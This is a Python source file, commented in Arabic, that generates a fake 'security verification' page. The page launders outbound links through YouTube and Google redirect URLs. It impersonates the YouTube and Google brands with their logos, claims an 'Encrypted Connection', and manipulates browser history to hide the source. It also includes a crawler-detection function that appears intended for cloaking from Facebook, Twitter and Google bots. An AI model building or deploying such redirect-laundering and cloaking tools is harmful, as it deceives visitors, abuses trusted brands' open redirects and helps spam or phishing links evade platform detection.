
import random
import urllib.parse

def get_laundry_html(target_url):
    # --- The Elite Blender V2 (Ultimate Edition) ---
    # المميزات:
    # 1. تنويع المصادر (YouTube + Google Images) لتشتيت الخوارزميات.
    # 2. إرسال Referrer قوي جداً (YouTube/Google) عبر النقر الحقيقي.
    # 3. تصميم "فحص أمني" احترافي يزيل خوف الزائر من صفحة التحويل.

    encoded_target = urllib.parse.quote(target_url)
    
    # قائمة البوابات (يمكنك إضافة المزيد مستقبلاً)
    gateways = [
        # بوابة يوتيوب (الأقوى - 50%)
        {
            "url": f"https://www.youtube.com/redirect?q={encoded_target}",
            "name": "YouTube Secure Gateway",
            "theme": "#FF0000",
            "icon": '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>'
        },
        # بوابة جوجل (التنويع - 50%)
        {
            "url": f"https://images.google.com/url?q={encoded_target}",
            "name": "Google Security Check",
            "theme": "#4285F4",
            "icon": '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z"/></svg>'
        }
    ]
    
    # اختيار عشوائي للبوابة
    gateway = random.choice(gateways)

    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Security Verification</title>
        <style>
            body {{ font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f8f9fa; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
            .card {{ background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; max-width: 380px; width: 90%; border: 1px solid #eee; }}
            .icon-box {{ width: 70px; height: 70px; background: {gateway['theme']}10; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: {gateway['theme']}; }}
            .icon-box svg {{ width: 35px; height: 35px; }}
            h1 {{ font-size: 22px; color: #1a1a1a; margin: 0 0 10px 0; font-weight: 700; }}
            p {{ color: #666; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }}
            .btn {{ background-color: {gateway['theme']}; color: white; border: none; padding: 15px 40px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; box-shadow: 0 4px 15px {gateway['theme']}40; transition: transform 0.2s; }}
            .btn:hover {{ transform: translateY(-2px); }}
            .security-badge {{ margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 12px; color: #999; }}
            .dot {{ width: 6px; height: 6px; background: #2ecc71; border-radius: 50%; }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="icon-box">
                {gateway['icon']}
            </div>
            <h1>{gateway['name']}</h1>
            <p>To ensure a secure connection, please verify your request by clicking the button below.</p>
            
            <a href="{gateway['url']}" class="btn">Click to Verify</a>
            
            <div class="security-badge">
                <div class="dot"></div> Encrypted Connection
            </div>
        </div>

        <script>
            // منع زر الرجوع لحماية المصدر
            if (window.history.replaceState) {{
                window.history.replaceState(null, null, window.location.href);
            }}
        </script>
    </body>
    </html>
    '''

# --- كشف البوتات (كما هو) ---
def is_bot(user_agent):
    if not user_agent: return True
    BOT_AGENTS = [
        "facebookexternalhit", "Facebot", "Twitterbot", "LinkedInBot",
        "WhatsApp", "TelegramBot", "Googlebot", "AdsBot", "crawler"
    ]
    for bot in BOT_AGENTS:
        if bot.lower() in user_agent.lower():
            return True
    return False
